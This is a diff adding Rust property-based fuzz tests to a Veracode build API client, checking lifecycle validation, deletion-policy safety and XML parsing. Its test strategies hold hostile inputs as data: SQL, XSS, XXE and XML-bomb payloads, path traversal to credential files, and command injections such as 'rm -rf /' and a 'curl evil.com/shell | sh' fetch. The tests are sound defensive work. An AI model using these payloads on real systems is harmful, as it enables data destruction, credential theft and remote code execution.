@@ -1452,3 +1452,687 @@ mod tests {
         assert!(!BuildStatus::Failed.is_safe_to_delete(255));
     }
 }
+
+#[cfg(test)]
+#[allow(clippy::expect_used)] // Test code: expect is acceptable for test setup
+mod proptests {
+    use super::*;
+    use proptest::prelude::*;
+
+    // Strategy for generating arbitrary build status strings
+    fn arbitrary_status_string() -> impl Strategy<Value = String> {
+        prop::string::string_regex("[A-Za-z0-9 -]{1,100}")
+            .expect("valid regex pattern for arbitrary status string")
+    }
+
+    // Strategy for generating valid lifecycle stages
+    fn valid_lifecycle_stage_strategy() -> impl Strategy<Value = &'static str> {
+        prop::sample::select(LIFECYCLE_STAGES)
+    }
+
+    // Strategy for generating invalid lifecycle stages (fuzzing)
+    fn invalid_lifecycle_stage_strategy() -> impl Strategy<Value = String> {
+        prop_oneof![
+            // Empty or whitespace
+            Just("".to_string()),
+            Just("   ".to_string()),
+            // Case variations of valid stages (should fail - case sensitive)
+            Just("in development (pre-alpha)".to_string()),
+            Just("DEPLOYED".to_string()),
+            // Partial matches
+            Just("In Development".to_string()),
+            Just("Deployed ".to_string()),
+            Just(" Maintenance".to_string()),
+            // SQL/XSS injection attempts
+            Just("'; DROP TABLE builds; --".to_string()),
+            Just("<script>alert('xss')</script>".to_string()),
+            // Path traversal
+            Just("../../etc/passwd".to_string()),
+            Just("..\\..\\windows\\system32".to_string()),
+            // Control characters
+            Just("Deployed\0".to_string()),
+            Just("Maintenance\n\r".to_string()),
+            // Unicode attacks
+            Just("Deployed\u{202E}".to_string()), // Right-to-left override
+            Just("Maintenance\u{FEFF}".to_string()), // Zero-width no-break space
+            // Very long strings
+            prop::string::string_regex(".{256,512}").expect("valid regex pattern for long strings"),
+        ]
+    }
+
+    proptest! {
+        #![proptest_config(ProptestConfig {
+            cases: if cfg!(miri) { 5 } else { 1000 },
+            failure_persistence: None,
+            .. ProptestConfig::default()
+        })]
+
+        /// Property: All valid lifecycle stages must be accepted
+        #[test]
+        fn proptest_valid_lifecycle_stages_always_accepted(
+            stage in valid_lifecycle_stage_strategy()
+        ) {
+            prop_assert!(is_valid_lifecycle_stage(stage));
+        }
+
+        /// Property: Invalid lifecycle stages must always be rejected
+        #[test]
+        fn proptest_invalid_lifecycle_stages_always_rejected(
+            stage in invalid_lifecycle_stage_strategy()
+        ) {
+            prop_assert!(!is_valid_lifecycle_stage(&stage));
+        }
+
+        /// Property: BuildStatus parsing must never panic on arbitrary input
+        #[test]
+        fn proptest_build_status_parsing_never_panics(
+            status in arbitrary_status_string()
+        ) {
+            let result = BuildStatus::from_string(&status);
+            // Must always produce a result (never panic)
+            prop_assert!(matches!(result, BuildStatus::Unknown(_)) ||
+                        matches!(result, BuildStatus::Incomplete) ||
+                        matches!(result, BuildStatus::NotSubmitted) ||
+                        matches!(result, BuildStatus::SubmittedToEngine) ||
+                        matches!(result, BuildStatus::ScanInProcess) ||
+                        matches!(result, BuildStatus::PreScanSubmitted) ||
+                        matches!(result, BuildStatus::PreScanSuccess) ||
+                        matches!(result, BuildStatus::PreScanFailed) ||
+                        matches!(result, BuildStatus::PreScanCancelled) ||
+                        matches!(result, BuildStatus::PrescanFailed) ||
+                        matches!(result, BuildStatus::PrescanCancelled) ||
+                        matches!(result, BuildStatus::ScanCancelled) ||
+                        matches!(result, BuildStatus::ResultsReady) ||
+                        matches!(result, BuildStatus::Failed) ||
+                        matches!(result, BuildStatus::Cancelled));
+        }
+
+        /// Property: BuildStatus roundtrip (from_string -> to_str) must be consistent for known statuses
+        #[test]
+        fn proptest_build_status_roundtrip_consistency(
+            status in prop::sample::select(vec![
+                "Incomplete", "Not Submitted", "Submitted to Engine", "Scan in Process",
+                "Pre-Scan Submitted", "Pre-Scan Success", "Pre-Scan Failed", "Pre-Scan Cancelled",
+                "Prescan Failed", "Prescan Cancelled", "Scan Cancelled", "Results Ready",
+                "Failed", "Cancelled"
+            ])
+        ) {
+            let parsed = BuildStatus::from_string(status);
+            let back_to_str = parsed.to_str();
+            prop_assert_eq!(back_to_str, status);
+        }
+
+        /// Property: Deletion policy 0 must NEVER allow deletion (safety critical)
+        #[test]
+        fn proptest_deletion_policy_0_never_deletes(
+            status in arbitrary_status_string()
+        ) {
+            let build_status = BuildStatus::from_string(&status);
+            prop_assert!(!build_status.is_safe_to_delete(0));
+        }
+
+        /// Property: Deletion policy must be monotonic (higher policy = more permissive)
+        #[test]
+        fn proptest_deletion_policy_monotonicity(
+            status in arbitrary_status_string(),
+            policy1 in 0u8..=2,
+            policy2 in 0u8..=2
+        ) {
+            let build_status = BuildStatus::from_string(&status);
+
+            // If policy1 allows deletion, policy2 (if higher) should also allow it
+            if policy1 <= policy2 && build_status.is_safe_to_delete(policy1) {
+                prop_assert!(build_status.is_safe_to_delete(policy2));
+            }
+        }
+
+        /// Property: Results Ready builds must NEVER be deletable under any valid policy
+        #[test]
+        fn proptest_results_ready_never_deletable(policy in 0u8..=2) {
+            prop_assert!(!BuildStatus::ResultsReady.is_safe_to_delete(policy));
+        }
+
+        /// Property: Invalid policies (>2) must default to safe (never delete)
+        #[test]
+        fn proptest_invalid_deletion_policy_safe_default(
+            status in arbitrary_status_string(),
+            policy in 3u8..=255
+        ) {
+            let build_status = BuildStatus::from_string(&status);
+            prop_assert!(!build_status.is_safe_to_delete(policy));
+        }
+
+        /// Property: Lifecycle stage validation must be consistent
+        #[test]
+        fn proptest_lifecycle_stage_validation_consistency(
+            stage in prop::string::string_regex(".{0,200}")
+                .expect("valid regex pattern for lifecycle stage")
+        ) {
+            let is_valid = is_valid_lifecycle_stage(&stage);
+
+            // If valid, must be in LIFECYCLE_STAGES array
+            if is_valid {
+                prop_assert!(LIFECYCLE_STAGES.contains(&stage.as_str()));
+            }
+
+            // If not in array, must be invalid
+            if !LIFECYCLE_STAGES.contains(&stage.as_str()) {
+                prop_assert!(!is_valid);
+            }
+        }
+    }
+}
+
+#[cfg(test)]
+mod api_request_fuzzing_proptests {
+    use super::*;
+    use proptest::prelude::*;
+
+    // Strategy for generating arbitrary app IDs with malicious patterns
+    fn malicious_app_id_strategy() -> impl Strategy<Value = String> {
+        prop_oneof![
+            // SQL injection patterns
+            Just("'; DROP TABLE apps; --".to_string()),
+            Just("' OR '1'='1".to_string()),
+            Just("1 UNION SELECT * FROM users--".to_string()),
+            // XSS patterns
+            Just("<script>alert('xss')</script>".to_string()),
+            Just("javascript:alert(1)".to_string()),
+            Just("\"><script>alert(String.fromCharCode(88,83,83))</script>".to_string()),
+            // Path traversal
+            Just("../../../etc/passwd".to_string()),
+            Just("..\\..\\..\\windows\\system32\\config\\sam".to_string()),
+            // Command injection
+            Just("; rm -rf /".to_string()),
+            Just("| cat /etc/shadow".to_string()),
+            Just("& net user hacker password /add".to_string()),
+            // Null byte injection
+            Just("123\0malicious".to_string()),
+            // Format string attacks
+            Just("%s%s%s%s%s%s%s%s%s%s".to_string()),
+            Just("%n%n%n%n%n".to_string()),
+            // LDAP injection
+            Just("*)(uid=*))(|(uid=*".to_string()),
+            // NoSQL injection
+            Just("{\"$ne\": null}".to_string()),
+            Just("{\"$gt\": \"\"}".to_string()),
+            // Empty/whitespace
+            Just("".to_string()),
+            Just("   ".to_string()),
+            // Very long strings (DoS)
+            prop::string::string_regex(".{1000,5000}")
+                .expect("valid regex pattern for very long strings"),
+            // Unicode normalization attacks
+            Just("\u{FEFF}123".to_string()), // Zero-width no-break space
+            Just("123\u{200B}".to_string()), // Zero-width space
+            Just("\u{202E}123\u{202D}".to_string()), // Right-to-left override
+            // Control characters
+            Just("123\r\n456".to_string()),
+            Just("123\t456\n789".to_string()),
+        ]
+    }
+
+    // Strategy for malicious version strings
+    fn malicious_version_strategy() -> impl Strategy<Value = String> {
+        prop_oneof![
+            // Path traversal in version
+            Just("../../../etc/passwd".to_string()),
+            Just("..\\..\\..\\windows\\system32".to_string()),
+            // Command injection
+            Just("1.0.0; curl evil.com/shell | sh".to_string()),
+            Just("1.0`whoami`".to_string()),
+            Just("1.0$(reboot)".to_string()),
+            // XSS
+            Just("<img src=x onerror=alert(1)>".to_string()),
+            // Very long version strings
+            prop::string::string_regex(".{500,1000}")
+                .expect("valid regex pattern for long version strings"),
+            // Special characters
+            Just("\0\0\0".to_string()),
+            Just("'\"\\n\\r\\t".to_string()),
+            // Unicode attacks
+            Just("\u{FEFF}1.0.0".to_string()),
+        ]
+    }
+
+    // Strategy for malicious date strings
+    fn malicious_date_strategy() -> impl Strategy<Value = String> {
+        prop_oneof![
+            // Invalid date formats
+            Just("2024-13-45".to_string()), // Invalid month/day
+            Just("99/99/9999".to_string()),
+            Just("00/00/0000".to_string()),
+            // SQL injection
+            Just("12/31/2024'; DROP TABLE dates; --".to_string()),
+            // Format string
+            Just("%s%s%s%s".to_string()),
+            // Command injection
+            Just("12/31/2024; cat /etc/passwd".to_string()),
+            // Very long dates
+            prop::string::string_regex(".{100,500}")
+                .expect("valid regex pattern for long date strings"),
+            // Negative values
+            Just("-1/-1/-1".to_string()),
+            // Integer overflow attempts
+            Just("99999999/99999999/99999999".to_string()),
+        ]
+    }
+
+    proptest! {
+        #![proptest_config(ProptestConfig {
+            cases: if cfg!(miri) { 5 } else { 500 },
+            failure_persistence: None,
+            .. ProptestConfig::default()
+        })]
+
+        /// Property: CreateBuildRequest construction never panics with malicious inputs
+        #[test]
+        fn proptest_create_build_request_malicious_input_safety(
+            app_id in malicious_app_id_strategy(),
+            version in malicious_version_strategy(),
+            launch_date in malicious_date_strategy()
+        ) {
+            // Construction must never panic
+            let request = CreateBuildRequest {
+                app_id: app_id.clone(),
+                version: Some(version.clone()),
+                lifecycle_stage: Some("In Development (pre-Alpha)".to_string()),
+                launch_date: Some(launch_date.clone()),
+                sandbox_id: None,
+            };
+
+            // Verify fields stored correctly (no injection/corruption)
+            prop_assert_eq!(request.app_id, app_id);
+            prop_assert_eq!(request.version, Some(version));
+            prop_assert_eq!(request.launch_date, Some(launch_date));
+        }
+
+        /// Property: UpdateBuildRequest construction never panics with malicious inputs
+        #[test]
+        fn proptest_update_build_request_malicious_input_safety(
+            app_id in malicious_app_id_strategy(),
+            build_id in malicious_app_id_strategy(),
+            version in malicious_version_strategy()
+        ) {
+            let request = UpdateBuildRequest {
+                app_id: app_id.clone(),
+                build_id: Some(build_id.clone()),
+                version: Some(version.clone()),
+                lifecycle_stage: None,
+                launch_date: None,
+                sandbox_id: None,
+            };
+
+            prop_assert_eq!(request.app_id, app_id);
+            prop_assert_eq!(request.build_id, Some(build_id));
+            prop_assert_eq!(request.version, Some(version));
+        }
+
+        /// Property: DeleteBuildRequest construction never panics with malicious inputs
+        #[test]
+        fn proptest_delete_build_request_malicious_input_safety(
+            app_id in malicious_app_id_strategy(),
+            sandbox_id in malicious_app_id_strategy()
+        ) {
+            let request = DeleteBuildRequest {
+                app_id: app_id.clone(),
+                sandbox_id: Some(sandbox_id.clone()),
+            };
+
+            prop_assert_eq!(request.app_id, app_id);
+            prop_assert_eq!(request.sandbox_id, Some(sandbox_id));
+        }
+
+        /// Property: Lifecycle stage validation rejects malicious inputs
+        #[test]
+        fn proptest_lifecycle_stage_rejects_malicious_input(
+            malicious_stage in prop_oneof![
+                malicious_app_id_strategy(),
+                malicious_version_strategy(),
+                Just("'; DROP TABLE stages; --".to_string()),
+                Just("<script>alert('xss')</script>".to_string()),
+            ]
+        ) {
+            // Malicious stages must not be validated as correct
+            // (unless by extreme chance they match a valid stage exactly)
+            let is_valid = is_valid_lifecycle_stage(&malicious_stage);
+
+            if is_valid {
+                // If somehow valid, must be in the whitelist
+                prop_assert!(LIFECYCLE_STAGES.contains(&malicious_stage.as_str()));
+            } else {
+                // Most malicious inputs should be rejected
+                prop_assert!(!LIFECYCLE_STAGES.contains(&malicious_stage.as_str()));
+            }
+        }
+
+        /// Property: Build structure handles malicious attributes safely
+        #[test]
+        fn proptest_build_structure_malicious_attributes(
+            key in malicious_version_strategy(),
+            value in malicious_app_id_strategy()
+        ) {
+            let mut build = Build {
+                build_id: "123".to_string(),
+                app_id: "456".to_string(),
+                version: None,
+                app_name: None,
+                sandbox_id: None,
+                sandbox_name: None,
+                lifecycle_stage: None,
+                launch_date: None,
+                submitter: None,
+                platform: None,
+                analysis_unit: None,
+                policy_name: None,
+                policy_version: None,
+                policy_compliance_status: None,
+                rules_status: None,
+                grace_period_expired: None,
+                scan_overdue: None,
+                policy_updated_date: None,
+                legacy_scan_engine: None,
+                attributes: HashMap::new(),
+            };
+
+            // Inserting malicious attributes must not panic
+            build.attributes.insert(key.clone(), value.clone());
+
+            // Verify stored correctly without corruption
+            prop_assert_eq!(build.attributes.get(&key), Some(&value));
+        }
+
+        /// Property: BuildError display never panics with malicious messages
+        #[test]
+        fn proptest_build_error_display_safety(
+            msg in malicious_app_id_strategy()
+        ) {
+            let errors = vec![
+                BuildError::InvalidParameter(msg.clone()),
+                BuildError::CreationFailed(msg.clone()),
+                BuildError::UpdateFailed(msg.clone()),
+                BuildError::DeletionFailed(msg.clone()),
+                BuildError::XmlParsingError(msg.clone()),
+            ];
+
+            for error in errors {
+                // Display must never panic
+                let _ = error.to_string();
+                let _ = format!("{error}");
+            }
+        }
+
+        /// Property: BuildStatus Unknown variant handles arbitrary strings safely
+        #[test]
+        fn proptest_build_status_unknown_variant_safety(
+            arbitrary_status in malicious_app_id_strategy()
+        ) {
+            let status = BuildStatus::Unknown(arbitrary_status.clone());
+
+            // to_str must never panic
+            let str_repr = status.to_str();
+            prop_assert_eq!(str_repr, arbitrary_status.as_str());
+
+            // Display must never panic
+            let _ = status.to_string();
+            let _ = format!("{status}");
+
+            // Deletion safety must still work
+            let _ = status.is_safe_to_delete(0);
+            let _ = status.is_safe_to_delete(1);
+            let _ = status.is_safe_to_delete(2);
+        }
+    }
+}
+
+#[cfg(test)]
+mod xml_parsing_proptests {
+    use super::*;
+    use crate::{VeracodeClient, VeracodeConfig};
+    use proptest::prelude::*;
+
+    // Strategy for generating malicious XML payloads
+    fn malicious_xml_strategy() -> impl Strategy<Value = String> {
+        prop_oneof![
+            // XML bomb (billion laughs attack) - simplified version
+            Just(r#"<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+]>
+<build build_id="&lol2;" app_id="123"/>"#.to_string()),
+
+            // XXE (External Entity) injection
+            Just(r#"<?xml version="1.0"?>
+<!DOCTYPE build [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<build build_id="&xxe;" app_id="123"/>"#.to_string()),
+
+            // Malformed/unclosed tags
+            Just("<build build_id=\"123\" app_id=\"456\"".to_string()),
+            Just("<build build_id=\"123\"><invalid></build>".to_string()),
+
+            // XSS in attributes
+            Just(r#"<build build_id="<script>alert('xss')</script>" app_id="123"/>"#.to_string()),
+            Just(r#"<build build_id="123" version="&lt;script&gt;alert('xss')&lt;/script&gt;"/>"#.to_string()),
+
+            // SQL injection in attributes
+            Just(r#"<build build_id="'; DROP TABLE builds; --" app_id="123"/>"#.to_string()),
+
+            // Path traversal in attributes
+            Just(r#"<build build_id="../../etc/passwd" app_id="123"/>"#.to_string()),
+
+            // Control characters and null bytes
+            Just("<build build_id=\"123\0\" app_id=\"456\"/>".to_string()),
+            Just("<build build_id=\"123\r\n\" app_id=\"456\"/>".to_string()),
+
+            // Unicode attacks
+            Just("<build build_id=\"123\u{202E}\" app_id=\"456\"/>".to_string()),
+
+            // Empty/missing required fields
+            Just("<build/>".to_string()),
+            Just("<build build_id=\"\"/>".to_string()),
+            Just("<build app_id=\"\"/>".to_string()),
+
+            // Deeply nested XML
+            Just("<a><b><c><d><e><f><g><h><i><j><build build_id=\"123\" app_id=\"456\"/></j></i></h></g></f></e></d></c></b></a>".to_string()),
+
+            // Very long attribute values
+            prop::string::string_regex(".{1000,2000}")
+                .expect("valid regex pattern for very long XML attributes")
+                .prop_map(|s| format!(r#"<build build_id="{s}" app_id="123"/>"#)),
+        ]
+    }
+
+    proptest! {
+        #![proptest_config(ProptestConfig {
+            cases: if cfg!(miri) { 5 } else { 500 },
+            failure_persistence: None,
+            .. ProptestConfig::default()
+        })]
+
+        /// Property: XML parsing must never panic on malicious input
+        #[test]
+        fn proptest_xml_parsing_never_panics_on_malicious_input(
+            xml in malicious_xml_strategy()
+        ) {
+            let config = VeracodeConfig::new("test_id", "test_key");
+            let client = VeracodeClient::new(config)
+                .expect("valid test client configuration");
+            let api = BuildApi::new(client);
+
+            // Should either parse successfully or return an error, never panic
+            let result = api.parse_build_info(&xml);
+            prop_assert!(result.is_ok() || result.is_err());
+        }
+
+        /// Property: XML parsing with error elements must return proper errors
+        #[test]
+        fn proptest_xml_error_handling(
+            error_msg in prop::string::string_regex(".{1,200}")
+                .expect("valid regex pattern for error messages")
+        ) {
+            let xml = format!("<error>{error_msg}</error>");
+            let config = VeracodeConfig::new("test_id", "test_key");
+            let client = VeracodeClient::new(config)
+                .expect("valid test client configuration");
+            let api = BuildApi::new(client);
+
+            let result = api.parse_build_info(&xml);
+
+            // Must return an error for error elements
+            prop_assert!(result.is_err());
+        }
+
+        /// Property: Valid minimal XML must parse successfully
+        /// Note: Uses opening/closing tags because parser doesn't handle self-closing <build/> in Event::Empty
+        #[test]
+        fn proptest_minimal_valid_xml_parsing(
+            build_id in "[0-9]{1,10}",
+            app_id in "[0-9]{1,10}"
+        ) {
+            let xml = format!(r#"<build build_id="{build_id}" app_id="{app_id}"></build>"#);
+            let config = VeracodeConfig::new("test_id", "test_key");
+            let client = VeracodeClient::new(config)
+                .expect("valid test client configuration");
+            let api = BuildApi::new(client);
+
+            let result = api.parse_build_info(&xml);
+
+            prop_assert!(result.is_ok());
+            if let Ok(build) = result {
+                prop_assert_eq!(build.build_id, build_id);
+                prop_assert_eq!(build.app_id, app_id);
+            }
+        }
+
+        /// Property: Build list parsing must handle empty lists
+        #[test]
+        fn proptest_empty_build_list_parsing(
+            app_id in "[0-9]{1,10}"
+        ) {
+            let xml = format!(r#"<buildlist app_id="{app_id}"></buildlist>"#);
+            let config = VeracodeConfig::new("test_id", "test_key");
+            let client = VeracodeClient::new(config)
+                .expect("valid test client configuration");
+            let api = BuildApi::new(client);
+
+            let result = api.parse_build_list(&xml);
+
+            prop_assert!(result.is_ok());
+            if let Ok(build_list) = result {
+                prop_assert_eq!(build_list.app_id, app_id);
+                prop_assert_eq!(build_list.builds.len(), 0);
+            }
+        }
+
+        /// Property: Date parsing must never panic
+        #[test]
+        fn proptest_date_parsing_safety(
+            date_str in prop::string::string_regex(".{0,100}")
+                .expect("valid regex pattern for date strings")
+        ) {
+            // Test that date parsing never panics, even with invalid input
+            use chrono::NaiveDate;
+            let _ = NaiveDate::parse_from_str(&date_str, "%m/%d/%Y");
+            // If we get here without panic, test passes
+        }
+
+        /// Property: Boolean parsing in XML must handle arbitrary strings safely
+        #[test]
+        fn proptest_boolean_parsing_safety(
+            bool_str in prop::string::string_regex(".{0,50}")
+                .expect("valid regex pattern for boolean strings")
+        ) {
+            // Test that boolean parsing never panics
+            let _ = bool_str.parse::<bool>();
+            // If we get here without panic, test passes
+        }
+    }
+}
+
+#[cfg(test)]
+#[allow(clippy::expect_used)] // Test code: expect is acceptable for test setup
+mod deletion_safety_proptests {
+    use super::*;
+    use proptest::prelude::*;
+
+    proptest! {
+        #![proptest_config(ProptestConfig {
+            cases: if cfg!(miri) { 5 } else { 1000 },
+            failure_persistence: None,
+            .. ProptestConfig::default()
+        })]
+
+        /// Property: Policy level 1 must only delete safe states (critical invariant)
+        #[test]
+        fn proptest_policy_1_only_deletes_safe_states(
+            status_str in prop::string::string_regex("[A-Za-z0-9 -]{1,100}")
+                .expect("valid regex pattern for status strings")
+        ) {
+            let status = BuildStatus::from_string(&status_str);
+            let is_deletable = status.is_safe_to_delete(1);
+
+            // If deletable under policy 1, must be a safe state
+            if is_deletable {
+                prop_assert!(matches!(
+                    status,
+                    BuildStatus::Incomplete
+                        | BuildStatus::NotSubmitted
+                        | BuildStatus::PreScanFailed
+                        | BuildStatus::PreScanCancelled
+                        | BuildStatus::PrescanFailed
+                        | BuildStatus::PrescanCancelled
+                        | BuildStatus::ScanCancelled
+                        | BuildStatus::Failed
+                        | BuildStatus::Cancelled
+                ));
+            }
+        }
+
+        /// Property: Policy level 2 must never delete ResultsReady (critical invariant)
+        #[test]
+        fn proptest_policy_2_never_deletes_results_ready(
+            _dummy in 0u8..1 // Dummy parameter for proptest macro
+        ) {
+            prop_assert!(!BuildStatus::ResultsReady.is_safe_to_delete(2));
+        }
+
+        /// Property: Unknown statuses under policy 1 must not be deletable (fail-safe)
+        #[test]
+        fn proptest_unknown_status_safe_default_policy_1(
+            unknown_status in prop::string::string_regex("[A-Za-z0-9 ]{1,100}")
+                .expect("valid regex pattern for unknown status strings")
+                .prop_filter("Must not match known statuses", |s| {
+                    !matches!(s.as_str(),
+                        "Incomplete" | "Not Submitted" | "Submitted to Engine" | "Scan in Process" |
+                        "Pre-Scan Submitted" | "Pre-Scan Success" | "Pre-Scan Failed" | "Pre-Scan Cancelled" |
+                        "Prescan Failed" | "Prescan Cancelled" | "Scan Cancelled" | "Results Ready" |
+                        "Failed" | "Cancelled"
+                    )
+                })
+        ) {
+            let status = BuildStatus::from_string(&unknown_status);
+
+            // Unknown statuses must not be deletable under policy 1 (fail-safe)
+            prop_assert!(!status.is_safe_to_delete(1));
+        }
+
+        /// Property: ScanInProcess must never be deletable under policy 1 (data integrity)
+        #[test]
+        fn proptest_scan_in_process_not_deletable_policy_1(
+            _dummy in 0u8..1
+        ) {
+            prop_assert!(!BuildStatus::ScanInProcess.is_safe_to_delete(1));
+        }
+
+        /// Property: PreScanSuccess must never be deletable under policy 1 (data preservation)
+        #[test]
+        fn proptest_prescan_success_not_deletable_policy_1(
+            _dummy in 0u8..1
+        ) {
+            prop_assert!(!BuildStatus::PreScanSuccess.is_safe_to_delete(1));
+        }
+    }
+}
